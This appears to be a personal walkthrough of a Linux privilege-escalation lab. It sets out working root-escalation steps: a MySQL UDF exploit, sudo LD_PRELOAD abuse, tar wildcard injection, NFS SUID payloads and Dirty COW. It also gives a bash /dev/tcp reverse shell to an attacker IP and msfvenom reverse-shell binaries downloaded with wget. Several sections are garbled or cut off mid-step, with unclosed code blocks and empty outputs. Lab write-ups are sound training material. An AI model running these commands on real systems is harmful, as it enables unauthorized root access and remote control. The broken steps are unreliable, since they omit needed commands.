# Task 2 : Service Exploits

Change into the /home/user/tools/mysql-udf directory:
```
cd /home/user/tools/mysql-udf
```
Compile the raptor_udf2.c exploit code using the following commands:
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```

# Task 7 : Sudo - Environment Variables

Check which environment variables are inherited (look for the env_keep options):
```
sudo -l
```
LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
```
sudo LD_PRELOAD=/tmp/preload.so awk
```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:
```
ldd /usr/sbin/apache2
```
Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
```
sudo LD_LIBRARY_PATH=/tmp apache2
```

# Task 8 : Cron Jobs - File Permissions

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:
```
locate overwrite.s
```
ouptut
```
/usr/local/bin/overwrite.sh
```

Note that the file is world-writable:
```
ls -l /usr/local/bin/overwrite.sh
```

overwrite the file with this 
```
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

start your listner 
```
nc -nvlp 4444
```
you'll get the shell in a minute and you're done ðŸ˜¸

# Task 9 : Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
`Note that the PATH variable starts with /home/user which is our user's home directory.`

Create a file called overwrite.sh in your home directory with the following contents:
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
now remove the temp file
```
rm /tmp/rootbash
exit
```

# Task 10 : Cron Jobs - Wildcards

View the contents of the other cron job script:
```
cat /usr/local/bin/compress.sh
```
Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
I used python webserver\
on attacker machine : `python3 -m http.server 80` and on the VM `wget <attackerip>/shell.elf`\
then
```
chmod +x /home/user/shell.elf
```
Create these two files in /home/user:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
```
nc -nvlp 4444
```
Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

# Task 12 : SUID / SGID Executables - Shared Object Injection

Find all the SUID/SGID executables on the Debian VM:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:
```
/usr/local/bin/suid-so
```
output:
```
Calculating something, please wait...
[=====================================================================>] 99 %

```
Run strace on the file and search the output for open/access calls and for "no such file" errors:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
ouptut:
```
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)

open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:
```
mkdir /home/user/.config
```
Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
```
/usr/local/bin/suid-so
```

The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:
```
/usr/local/bin/suid-env
```
output:
```

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.\
Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
```
gcc -o service /home/user/tools/suid/service.c
```
Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
```

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:
```
/bin/bash --version

# Task 16 : Passwords & Keys - History Files
If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:
```
cat ~/.*history | less
```
output:
```
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
bla bla bla...
```
Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:
```
su root
```

# Task 17 : Passwords & Keys - Config Files
Config files often contain passwords in plaintext or other reversible formats.

Note the presence of a myvpn.ovpn config file. View the contents of the file:

# Task 19 : NFS
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:
```
cat /etc/exports
```
output:
```
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:
```
sudo su
```
Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
```
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```
output:
```
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service â†’ /usr/lib/systemd/system/rpc-statd.service.
```
Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
output:
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of elf file: 132 bytes
Error: No such file or directory @ rb_sysopen - /tmp/nfs/shell.elf
```
Still using Kali's root user, make the file executable and set the SUID permission:
```
chmod +xs /tmp/nfs/shell.elf
```
Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
```
/tmp/shell.elf
```
output:
```
user@debian:/tmp$ ./shell.elf 
bash-4.1#

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):
```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```
output:
```

DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 33231000

```
Once the exploit completes, run /usr/bin/passwd to gain a root shell:
```
/usr/bin/passwd
```
output:
```
user@debian:~$ /usr/bin/passwd

```
Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
```
mv /tmp/bak /usr/bin/passwd
exit
```
